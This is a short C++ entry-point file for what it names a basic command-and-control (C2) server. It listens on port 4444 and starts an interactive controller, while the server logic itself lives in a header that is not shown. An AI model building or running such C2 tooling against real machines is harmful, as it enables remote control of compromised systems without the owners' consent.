// main_server.cpp
#include "server.h"

int main() {
    try {
        BasicC2Server server(4444);
        
        // Start server in background thread
        thread server_thread([&server]() {
            server.start();
        });
        
        // Start interactive controller
        C2Controller::start_interactive_controller(&server);
        
        server.stop();
        server_thread.join();
        
    } catch (const exception& e) {
        cerr << "Server error: " << e.what() << endl;
        return 1;
    }
    
    return 0;
}